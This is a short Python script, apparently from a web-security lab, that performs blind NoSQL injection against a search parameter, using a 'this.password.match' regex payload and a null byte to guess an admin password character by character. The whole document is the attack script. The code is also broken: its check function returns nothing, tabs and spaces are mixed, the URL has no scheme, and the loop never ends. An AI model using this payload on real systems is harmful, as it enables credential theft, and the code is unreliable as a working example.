import urllib.request
import string

#https://ptl-4762fd2c-dc9773c3.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^n/)%00

URL = "ptl-4762fd2c-dc9773c3.libcurl.so"

def check(payload):
	url = URL+"/?search=admin%27%26%26%20this.password.match(/"+payload+"/)%00"
	print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()

#print(check("^demo.*$"))
#print(check("^delo.*$"))

CHARSET = list("-"+string.ascii_lowercase+string.digits)
password = ""

while True:
	for c in CHARSET:
		print("Trying: "+c+" for "+password)
		test = password+c
		if check("^"+test+".*$"):
			password+=c
			print(password)
			break
		elif c == CHARSET[-1]:
            print(password)
exit(0)